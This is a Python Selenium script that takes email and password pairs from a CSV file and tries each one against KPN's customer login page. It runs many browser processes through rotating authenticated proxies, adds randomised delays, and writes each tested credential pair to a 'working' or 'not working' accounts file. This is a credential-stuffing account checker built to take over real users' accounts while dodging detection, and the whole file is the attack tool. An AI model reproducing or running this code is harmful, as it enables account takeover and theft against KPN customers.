import time
import random
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options as c_Options
from multiprocessing import Process
from multiprocessing import freeze_support
import zipfile
import math

global PATH_chrome, PATH_firefox, PATH_comodo
PATH_chrome = ".\\chromedriver.exe"

def login(email,password):
    driver.get("https://inloggen.kpn.com/")
    # driver.get("https://myip.com/")
    time.sleep(5)
    try:
        c = driver.find_element_by_id('onetrust-accept-btn-handler')
        c.click()
    except Exception as e:
        print(e)
        pass

    time.sleep(2)
    e = driver.find_element_by_id('email')
    e.send_keys(email)
    time.sleep(random.uniform(1,2))
    e.send_keys(Keys.TAB)

    time.sleep(random.uniform(2,3))
    p = driver.find_element_by_id('password')
    p.send_keys(password)
    time.sleep(random.uniform(1,2))
    p.send_keys(Keys.RETURN)

    time.sleep(2)

    try:
        n = driver.find_elements_by_class_name("notification-text")

        print("[Login Status] : Login Success")
        f = open(".\\Working_accounts.txt", "a+")
        f.write("Email : " + email + " | Password : " + password + "\n\r")
        f.close()
        time.sleep(4)

    except Exception as e:
        print(e)
        print("[Login Status] : Login Failed")
        f = open(".\\Not_working_accounts.txt", "a+")
        f.write("Email : " + email + " | Password : " + password + "\n\r")
        f.close()

    try:
        profile = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "//span[contains(text(),'Profiel')]")))
        print(profile)
        time.sleep(random.uniform(1, 2))
        ActionChains(driver).move_to_element(profile).click(profile).perform()
        time.sleep(random.uniform(6, 7))
        logout = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "//button[@id='logoutButton']")))
        time.sleep(random.uniform(1, 2))
        ActionChains(driver).move_to_element(logout).click(logout).perform()
        print('[Status] : Login & Logout done successfully')
    except Exception as e:
        print('[ERROR] :',e)


    time.sleep(3)
    driver.close()
def isNaN(string):
    return string != string
def init_browser(ip,port,p_user,p_password):
    PROXY_HOST = ip
    PROXY_PORT = port
    PROXY_USER = p_user
    PROXY_PASS = p_password

    print(isNaN(PROXY_HOST),isNaN(PROXY_PORT),isNaN(PROXY_USER),isNaN(PROXY_PASS))

    manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

    background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                  singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                  },
                  bypassList: ["localhost"]
                }
              };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)

    background_js_1 = """
        var config = {
                mode: "fixed_servers",
                rules: {
                  singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                  },
                  bypassList: ["localhost"]
                }
              };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        """ % (PROXY_HOST, PROXY_PORT)
    global driver

    if isNaN(ip) == True and isNaN(port) == True and isNaN(p_user) == True and isNaN(p_password) == True:
        print('[Browser] Chrome without proxy : Activated')
        chrome_options = webdriver.ChromeOptions()
        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)

    elif isNaN(p_user) == True and isNaN(p_password) == True :
        proxy_ip_port = str(ip) + ':' + str(port)

        print('[Browser] Chrome proxy : Activated')
        chrome_options = webdriver.ChromeOptions()
        use_proxy = True
        user_agent = None
        if use_proxy:
            pluginfile = 'proxy_plugin.zip'
            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js_1)
            chrome_options.add_extension(pluginfile)
        if user_agent:
            chrome_options.add_argument('--user-agent=%s' % user_agent)
        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)

    else:
        print('[Browser] Chrome proxy with auth : Activated')
        chrome_options = webdriver.ChromeOptions()
        use_proxy = True
        user_agent = None
        if use_proxy:
            pluginfile = 'proxy_auth_plugin.zip'
            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js)
            chrome_options.add_extension(pluginfile)
        if user_agent:
            chrome_options.add_argument('--user-agent=%s' % user_agent)
        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)

    return driver

def run(email,password,ip,port,p_user,p_password):
    init_browser(ip,port,p_user,p_password)
    login(email,password)

def launch(n):
    data = pd.read_csv('.\\data.csv',sep=';')

    emails = data['Email'].tolist()
    passwords = data['Password'].tolist()
    ips = data['ip'].tolist()
    ports = data['port'].tolist()
    p_users = data['p_user'].tolist()
    p_passwords = data['p_password'].tolist()
    processes = []

    while (len(emails) != 0):
        for i in range(int(n)):
            p = Process(target=run, args=(emails[0], passwords[0], ips[0], ports[0], p_users[0], p_passwords[0]))
            p.start()
            time.sleep(random.uniform(1, 2))
            processes.append(p)

            emails.remove(emails[0]), passwords.remove(passwords[0]), ips.remove(ips[0]), ports.remove(ports[0]), p_users.remove(p_users[0]), p_passwords.remove(p_passwords[0])

        for process in processes:
            process.join()


    print("######### Script Done #########")

if __name__ == '__main__':
    freeze_support()
    n = input('Number of threads   : ')
    launch(n)
